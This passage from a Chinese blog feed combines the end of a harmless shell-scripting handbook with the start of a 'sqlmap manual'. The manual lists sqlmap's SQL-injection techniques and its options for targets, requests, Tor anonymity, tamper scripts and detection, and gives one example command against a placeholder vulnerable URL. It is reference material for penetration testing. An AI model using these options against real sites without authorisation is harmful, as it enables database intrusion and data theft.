class="line">b&#x3D;&quot;efg&quot;</span><br><span class="line">if [ $a &#x3D; $b ]   # 检测两个字符串是否相等，相等返回 true。</span><br><span class="line">if [ $a !&#x3D; $b ]  # 检测两个字符串是否相等，不相等返回 true。</span><br><span class="line">if [ -z $a ]     # 检测字符串长度是否为0，为0返回 true。</span><br><span class="line">if [ -n &quot;$a&quot; ]   # 检测字符串长度是否为0，不为0返回 true。</span><br><span class="line">if [ $a ]        # 检测字符串是否为空，不为空返回 true。</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><h3 id="⑥-文件测试运算符"><a href="#⑥-文件测试运算符" class="headerlink" title="⑥ 文件测试运算符"></a>⑥ 文件测试运算符</h3><p>文件测试运算符用于检测 Unix 文件的各种属性。</p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>-b file</td><td>检测文件是否是块设备文件，如果是，则返回 true。</td></tr><tr><td>-c file</td><td>检测文件是否是字符设备文件，如果是，则返回 true。</td></tr><tr><td>-d file</td><td>检测文件是否是目录，如果是，则返回 true。</td></tr><tr><td>-f file</td><td>检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td></tr><tr><td>-g file</td><td>检测文件是否设置了 SGID 位，如果是，则返回 true。</td></tr><tr><td>-k file</td><td>检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td></tr><tr><td>-p file</td><td>检测文件是否是有名管道，如果是，则返回 true。</td></tr><tr><td>-u file</td><td>检测文件是否设置了 SUID 位，如果是，则返回 true。</td></tr><tr><td>-r file</td><td>检测文件是否可读，如果是，则返回 true。</td></tr><tr><td>-w file</td><td>检测文件是否可写，如果是，则返回 true。</td></tr><tr><td>-x file</td><td>检测文件是否可执行，如果是，则返回 true。</td></tr><tr><td>-s file</td><td>检测文件是否为空（文件大小是否大于0），不为空返回 true。</td></tr><tr><td>-e file</td><td>检测文件（包括目录）是否存在，如果是，则返回 true。</td></tr></tbody></table><h2 id="5-echo"><a href="#5-echo" class="headerlink" title="5. echo"></a>5. echo</h2><h3 id="①-命令格式"><a href="#①-命令格式" class="headerlink" title="① 命令格式"></a>① 命令格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;It is a test&quot;</span><br><span class="line">echo It is a test</span><br><span class="line">echo &quot;\&quot;It is a test\&quot;&quot;      # 转义</span><br><span class="line">name&#x3D;Chris</span><br><span class="line">echo &quot;$name is handsome&quot;</span><br><span class="line">echo -e &quot;OK! \n&quot;             # 显示换行 -e 开启转义</span><br><span class="line">echo &quot;It is a test&quot; &gt; myfile # 显示结果定向至文件</span><br><span class="line">echo &#39;$name\&quot;&#39;               # 原样输入字符串，不进行转义或取变量（使用单引号）</span><br><span class="line">echo &#96;date&#96;                  # 显示命令执行结构</span><br><span class="line">12345678910</span><br></pre></td></tr></table></figure><h3 id="②-颜色显示"><a href="#②-颜色显示" class="headerlink" title="② 颜色显示"></a>② 颜色显示</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;\033[字背景颜色；文字颜色m字符串\033[0m&quot;</span><br><span class="line"></span><br><span class="line">echo -e “\033[30m 黑色字 \033[0m”</span><br><span class="line">echo -e “\033[31m 红色字 \033[0m”</span><br><span class="line">echo -e “\033[32m 绿色字 \033[0m”</span><br><span class="line">echo -e “\033[33m 黄色字 \033[0m”</span><br><span class="line">echo -e “\033[34m 蓝色字 \033[0m”</span><br><span class="line">echo -e “\033[35m 紫色字 \033[0m”</span><br><span class="line">echo -e “\033[36m 天蓝字 \033[0m”</span><br><span class="line">echo -e “\033[37m 白色字 \033[0m”</span><br><span class="line"></span><br><span class="line">echo -e “\033[40;37m 黑底白字 \033[0m”</span><br><span class="line">echo -e “\033[41;37m 红底白字 \033[0m”</span><br><span class="line">echo -e “\033[42;37m 绿底白字 \033[0m”</span><br><span class="line">echo -e “\033[43;37m 黄底白字 \033[0m”</span><br><span class="line">echo -e “\033[44;37m 蓝底白字 \033[0m”</span><br><span class="line">echo -e “\033[45;37m 紫底白字 \033[0m”</span><br><span class="line">echo -e “\033[46;37m 天蓝底白字 \033[0m”</span><br><span class="line">echo -e “\033[47;30m 白底黑字 \033[0m”</span><br><span class="line"></span><br><span class="line">\33[0m 关闭所有属性</span><br><span class="line">\33[1m 设置高亮度</span><br><span class="line">\33[4m 下划线</span><br><span class="line">\33[5m 闪烁</span><br><span class="line">\33[7m 反显</span><br><span class="line">\33[8m 消隐</span><br><span class="line">\33[30m — \33[37m 设置前景色</span><br><span class="line">\33[40m — \33[47m 设置背景色</span><br><span class="line">\33[nA 光标上移n行</span><br><span class="line">\33[nB 光标下移n行</span><br><span class="line">\33[nC 光标右移n行</span><br><span class="line">\33[nD 光标左移n行</span><br><span class="line">\33[y;xH设置光标位置</span><br><span class="line">\33[2J 清屏</span><br><span class="line">\33[K 清除从光标到行尾的内容</span><br><span class="line">\33[s 保存光标位置</span><br><span class="line">\33[u 恢复光标位置</span><br><span class="line">\33[?25l 隐藏光标</span><br><span class="line">\33[?25h 显示光标</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536373839</span><br></pre></td></tr></table></figure><h2 id="6-sprintf"><a href="#6-sprintf" class="headerlink" title="6. sprintf"></a>6. sprintf</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">printf &quot;%-10s %-8s %-4s\n&quot; 姓名 性别 体重kg  </span><br><span class="line">printf &quot;%-10s %-8s %-4.2f\n&quot; 郭靖 男 66.1234</span><br><span class="line">printf &quot;%-10s %-8s %-4.2f\n&quot; 杨过 男 48.6543</span><br><span class="line">printf &quot;%-10s %-8s %-4.2f\n&quot; 郭芙 女 47.9876</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名     性别   体重kg</span><br><span class="line">郭靖     男      66.12</span><br><span class="line">杨过     男      48.65</span><br><span class="line">郭芙     女      47.99</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><blockquote><p><code>%s %c %d %f</code> 都是格式替代符<br><code>d</code>: Decimal 十进制整数 – 对应位置参数必须是十进制整数，否则报错！<br><code>s</code>: String 字符串 – 对应位置参数必须是字符串或者字符型，否则报错！<br><code>c</code>: Char 字符 – 对应位置参数必须是字符串或者字符型，否则报错！<br><code>f</code>: Float 浮点 – 对应位置参数必须是数字型，否则报错！<br><code>%-10s</code> 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐）,任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。<br><code>%-4.2f</code> 指格式化为小数，其中.2指保留2位小数。</p></blockquote><h2 id="7-test"><a href="#7-test" class="headerlink" title="7. test"></a>7. test</h2><p>Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">num1&#x3D;100</span><br><span class="line">num2&#x3D;100</span><br><span class="line">if test $[num1] -eq $[num2]</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><h2 id="8-流程控制"><a href="#8-流程控制" class="headerlink" title="8. 流程控制"></a>8. 流程控制</h2><h3 id="①-if-else"><a href="#①-if-else" class="headerlink" title="① if-else"></a>① if-else</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">a&#x3D;10</span><br><span class="line">b&#x3D;20</span><br><span class="line">if [ $a &#x3D;&#x3D; $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 等于 b&quot;</span><br><span class="line">elif [ $a -gt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 大于 b&quot;</span><br><span class="line">elif [ $a -lt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 小于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;没有符合的条件&quot;</span><br><span class="line">fi</span><br><span class="line">123456789101112131415</span><br></pre></td></tr></table></figure><h3 id="②-for"><a href="#②-for" class="headerlink" title="② for"></a>② for</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for loop in 1 2 3 4 5</span><br><span class="line">do</span><br><span class="line">    echo &quot;The value is: $loop&quot;</span><br><span class="line">done</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><h3 id="③-while"><a href="#③-while" class="headerlink" title="③ while"></a>③ while</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">int&#x3D;1</span><br><span class="line">while(( $int&lt;&#x3D;5 ))</span><br><span class="line">do</span><br><span class="line">    echo $int</span><br><span class="line">    let &quot;int++&quot;</span><br><span class="line">done</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure><h3 id="④-case"><a href="#④-case" class="headerlink" title="④ case"></a>④ case</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &#39;输入 1 到 4 之间的数字:&#39;</span><br><span class="line">echo &#39;你输入的数字为:&#39;</span><br><span class="line">read aNum</span><br><span class="line">case $aNum in</span><br><span class="line">    1)  echo &#39;你选择了 1&#39;</span><br><span class="line">    ;;</span><br><span class="line">    2)  echo &#39;你选择了 2&#39;</span><br><span class="line">    ;;</span><br><span class="line">    3)  echo &#39;你选择了 3&#39;</span><br><span class="line">    ;;</span><br><span class="line">    4)  echo &#39;你选择了 4&#39;</span><br><span class="line">    ;;</span><br><span class="line">    *)  echo &#39;你没有输入 1 到 4 之间的数字&#39;</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line">12345678910111213141516</span><br></pre></td></tr></table></figure><h3 id="⑤-break"><a href="#⑤-break" class="headerlink" title="⑤ break"></a>⑤ break</h3><p>break命令允许跳出所有循环（终止执行后面的所有循环）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    echo -n &quot;输入 1 到 5 之间的数字:&quot;</span><br><span class="line">    read aNum</span><br><span class="line">    case $aNum in</span><br><span class="line">        1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *) echo &quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;</span><br><span class="line">            break</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">12345678910111213</span><br></pre></td></tr></table></figure><h3 id="⑥-continue"><a href="#⑥-continue" class="headerlink" title="⑥ continue"></a>⑥ continue</h3><p>跳出当前循环。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    echo -n &quot;输入 1 到 5 之间的数字: &quot;</span><br><span class="line">    read aNum</span><br><span class="line">    case $aNum in</span><br><span class="line">        1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *) echo &quot;你输入的数字不是 1 到 5 之间的!&quot;</span><br><span class="line">            continue</span><br><span class="line">            echo &quot;游戏结束&quot;</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">1234567891011121314</span><br></pre></td></tr></table></figure><h3 id="⑦-until"><a href="#⑦-until" class="headerlink" title="⑦ until"></a>⑦ until</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">a&#x3D;0</span><br><span class="line"></span><br><span class="line">until [ ! $a -lt 10 ]</span><br><span class="line">do</span><br><span class="line">   echo $a</span><br><span class="line">   a&#x3D;&#96;expr $a + 1&#96;</span><br><span class="line">done</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure><h2 id="9-函数"><a href="#9-函数" class="headerlink" title="9. 函数"></a>9. 函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">funWithParam()&#123;</span><br><span class="line">    echo &quot;第一个参数为 $1 !&quot;</span><br><span class="line">    echo &quot;第二个参数为 $2 !&quot;</span><br><span class="line">    echo &quot;第十个参数为 $10 !&quot;</span><br><span class="line">    echo &quot;第十个参数为 $&#123;10&#125; !&quot;</span><br><span class="line">    echo &quot;第十一个参数为 $&#123;11&#125; !&quot;</span><br><span class="line">    echo &quot;参数总数有 $# 个!&quot;</span><br><span class="line">    echo &quot;作为一个字符串输出所有参数 $* !&quot;</span><br><span class="line">&#125;</span><br><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span><br><span class="line">123456789101112</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一个参数为 1 !</span><br><span class="line">第二个参数为 2 !</span><br><span class="line">第十个参数为 10 !</span><br><span class="line">第十个参数为 34 !</span><br><span class="line">第十一个参数为 73 !</span><br><span class="line">参数总数有 11 个!</span><br><span class="line">作为一个字符串输出所有参数 1 2 3 4 5 6 7 8 9 34 73 !</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure><h2 id="10-输入输出"><a href="#10-输入输出" class="headerlink" title="10. 输入输出"></a>10. 输入输出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">who &gt; today.log # 执行结果覆盖到文件 today.log</span><br><span class="line">echo &quot;菜鸟教程：www.runoob.com&quot; &gt;&gt; today.log # 执行结果追加到文件 today.log</span><br><span class="line">wc -l &lt; today.log # 统计 today.log 行数</span><br><span class="line">wc -l &lt;&lt; EOF</span><br><span class="line">    李白</span><br><span class="line">    苏轼</span><br><span class="line">    王勃</span><br><span class="line">EOF</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure><h2 id="11-文件包含"><a href="#11-文件包含" class="headerlink" title="11. 文件包含"></a>11. 文件包含</h2><p>test1.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">name&#x3D;&quot;Chris&quot;</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>test2.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#使用 . 号来引用test1.sh 文件</span><br><span class="line">. .&#x2F;test1.sh</span><br><span class="line"></span><br><span class="line"># 或者使用以下包含文件代码</span><br><span class="line"># source .&#x2F;test1.sh</span><br><span class="line"></span><br><span class="line">echo $name</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><blockquote><p>注：被包含的文件 test1.sh 不需要可执行权限。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-变量&quot;&gt;&lt;a href=&quot;#1-变量&quot; class=&quot;headerlink&quot; title=&quot;1. 变量&quot;&gt;&lt;/a&gt;1. 变量&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="编程手册" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="shell编程" scheme="http://yoursite.com/tags/shell%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap手册</title>
    <link href="http://yoursite.com/2020/02/25/sqlmap/"/>
    <id>http://yoursite.com/2020/02/25/sqlmap/</id>
    <published>2020-02-25T15:24:36.000Z</published>
    <updated>2020-02-25T15:07:33.785Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sqlmap五种注入模式："><a href="#sqlmap五种注入模式：" class="headerlink" title="sqlmap五种注入模式："></a>sqlmap五种注入模式：</h3><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li><li>联合查询注入，可以使用union的情况下的注入；</li><li>堆查询注入，可以同时执行多条语句的执行时的注入</li></ol><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h4><ol><li>-h,–help  显示基本帮助信息并退出</li><li>-hh    显示高级帮助信息并退出</li><li>–version  显示程序版本信息并退出</li><li>-v VERBOSE信息级别: 0-6  （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</li></ol><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><ul><li>在这些选项中必须提供至少有一个确定目标</li></ul><ol><li>-d DIRECT    直接连接数据库的连接字符串</li><li>-u URL, –url=URL   目标URL (e.g.”<a href="http://www.site.com/vuln.php?id=1“)，使用-u或者–url" target="_blank" rel="noopener">http://www.site.com/vuln.php?id=1“)，使用-u或者–url</a></li><li>-l LOGFILE     从Burp或者WebScarab代理日志文件中分析目标</li><li>-x SITEMAPURL  从远程网站地图（sitemap.xml）文件来解析目标</li><li>-m BULKFILE      将目标地址保存在文件中，一行为一个URL地址进行批量检测。</li><li>-r REQUESTFILE    从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443</li><li>-g GOOGLEDORK     从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</li><li>-c CONFIGFILE       从配置ini文件中加载选项</li></ol><h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><ul><li>这些选项可以用来指定如何连接到目标URL</li></ul><ol><li>-–method=METHOD  强制使用给定的HTTP方法（例如put）</li><li>–data=DATA   <strong>通过POST发送数据</strong>参数，sqlmap会像检测GET参数一样检测POST的参数。–data=”id=1” -f –banner –dbs –users</li><li>-–param-del=PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</li><li>–cookie=COOKIE     <strong>HTTP Cookieheader 值</strong></li><li>–cookie-del=COO..  用来分隔cookie的字符串值</li><li>–load-cookies=L..  Filecontaining cookies in Netscape/wget format  包含Netscape / wget格式的cookie的文件</li><li>–drop-set-cookie   IgnoreSet-Cookie header from response    从响应中忽略Set-Cookie头</li><li>–user-agent=AGENT  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(<a href="http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入" target="_blank" rel="noopener">http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</a></li><li>–random-agent     使用random-agent作为HTTP User-Agent头值</li><li>–host=HOST         HTTP Hostheader value    HTTP主机头值</li><li>–referer=REFERER   sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</li><li>-H HEADER, –hea..  额外的http header头(e.g.”X-Forwarded-For: 127.0.0.1″)</li><li>–headers=HEADERS  可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\nETag: 123″)</li><li>–auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)</li><li>–auth-cred=AUTH..  HTTP 认证凭证(name:password)</li><li>–auth-file=AUTH..  HTTP  认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</li><li>–ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）</li><li>–ignore-proxy      忽略系统的默认代理设置</li><li>–ignore-redirects    忽略重定向的尝试</li><li>–ignore-timeouts   忽略连接超时</li><li>–proxy=PROXY       使用代理服务器连接到目标URL</li><li>–proxy-cred=PRO..  代理认证凭证(name:password)</li><li>–proxy-file=PRO..  从文件加载代理列表</li><li>–tor               使用Tor匿名网络</li><li>–tor-port=TORPORT  设置Tor代理端口</li><li>-–tor-type=TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))</li><li>–check-tor       检查Tor的是否正确使用</li><li>–delay=DELAY   可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</li><li>–timeout=TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</li><li>–retries=RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</li><li>–randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</li><li>–safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下</li><li>–safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</li><li>–safe-req=SAFER..  从文件中加载安全HTTP请求</li><li>–safe-freq=SAFE..  测试一个给定安全网址的两个访问请求</li><li>–skip-urlencode    跳过URL的有效载荷数据编码</li><li>–csrf-token=CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌</li><li>–csrf-url=CSRFURL  URL地址访问提取anti-CSRF令牌</li><li>–force-ssl         强制使用SSL/HTTPS</li><li>–hpp               使用HTTP参数污染的方法</li><li>–eval=EVALCODE      在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”)</li></ol><ul><li>sqlmap.py -u”<a href="http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“–eval=”import" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“–eval=”import</a> hashlib;hash=hashlib.md5(id).hexdigest()”</li></ul><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><ul><li>这些选项可用于优化sqlmap性能</li></ul><ol><li>-o               打开所有的优化开关</li><li>–predict-output    预测普通查询输出</li><li>–keep-alive        使用持久HTTP（S）连接</li><li>–null-connection   从没有实际的HTTP响应体中检索页面长度</li><li>–threads=THREADS   当前http(s)最大请求数 (默认 1)</li></ol><h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><ul><li>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</li></ul><ol><li>-p TESTPARAMETER    可测试的参数</li><li>–skip=SKIP         跳过对给定参数的测试</li><li>–skip-static       跳过测试不显示为动态的参数</li><li>–param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）</li><li>–dbms=DBMS         强制后端的DBMS为此值</li><li>–dbms-cred=DBMS..  DBMS认证凭证(user:password)</li><li>–os=OS            强制后端的DBMS操作系统为这个值</li><li>–invalid-bignum    使用大数字使值无效</li><li>–invalid-logical   使用逻辑操作使值无效</li><li>–invalid-string    使用随机字符串使值无效</li><li>–no-cast          关闭有效载荷铸造机制</li><li>–no-escape         关闭字符串逃逸机制</li><li>–prefix=PREFIX     注入payload字符串前缀</li><li>–suffix=SUFFIX     注入payload字符串后缀</li><li>–tamper=TAMPER   使用给定的脚本篡改注入数据</li></ol><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><ul><li>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</li></ul><ol><li>–level=LEVEL     执行测试的等级（1-5，默认为1）</li><li>–risk=RISK       执行测试的风险（0-3，默认为1）</li><li>–string=STRING    查询时有效时在页面匹配字符串</li><li>–not-string=NOT..  当查询求值为无效时匹配的字符串</li><li>–regexp=REGEXP     查询时有效时在页面匹配正则表达式</li><li>–code=CODE       当查询求值为True时匹配的HTTP代码</li><li>–text-only        仅基于在文本内容比较网页</li><li>–titles           仅根据他们的标题进行比较</li></ol><h4 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h4><ul><li>这些选项可用于调整具体的SQL注入测试</li></ul><ol><li>–technique=TECH    SQL注入技术测试（默认BEUST）</li><li>–time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）</li><li>–union-cols=UCOLS  定列范围用于测试UNION查询注入</li><li>–union-char=UCHAR  